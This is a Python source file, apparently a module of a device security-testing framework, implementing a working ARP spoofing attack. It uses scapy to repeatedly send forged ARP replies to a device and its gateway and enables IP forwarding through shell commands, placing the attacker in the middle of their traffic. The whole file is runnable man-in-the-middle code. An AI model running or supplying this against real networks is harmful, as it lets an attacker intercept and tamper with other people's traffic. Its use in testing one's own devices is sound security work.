import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import*
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from util import ioutil
import time
import platform

class ArpSpoof(GenericAttack):
    """ARP spoofing class
    """
    def __init__(self, attackName, attackConfig, deviceConfig):
        super(ArpSpoof, self).__init__(attackName, attackConfig, deviceConfig)


    def initialize(self, result):
        self.running = True
        self.respoofer(self.device["ip"], self.device["gateway-ip"])
        return

    def respoofer(self, targetIP, victim):
        """ Respoof the target every two seconds.
        """
        self.enable_packet_forwarding()
        try:
            while self.running:
                print(self.running)
                self.arpspoof(targetIP, victim)
                time.sleep(1)

            self.restoreARP(targetIP, victim)
            self.disable_packet_forwarding()
        except Exception, j:
            self.restoreARP(targetIP, victim)
            self.disable_packet_forwarding()

    # enables packet forwarding by interacting with the proc filesystem
    def enable_packet_forwarding(self):
        if platform.system() == "Darwin":
            os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
            os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')
        else:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # disables packet forwarding by interacting with the proc filesystem
    def disable_packet_forwarding(self):
        if platform.system() == "Darwin":
            os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')
            os.system('sudo sysctl -w net.inet.ip.fw.enable=0 > /dev/null ')
        else:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def arpspoof(self, gatewayIP, victimIP):
        victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
        gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIP)
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMAC))

    def restoreARP(self, gatewayIP, victimIP):
        victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
        gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIP)
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)

    def shutdown(self):
        self.running = False
        time.sleep(3)
        return True

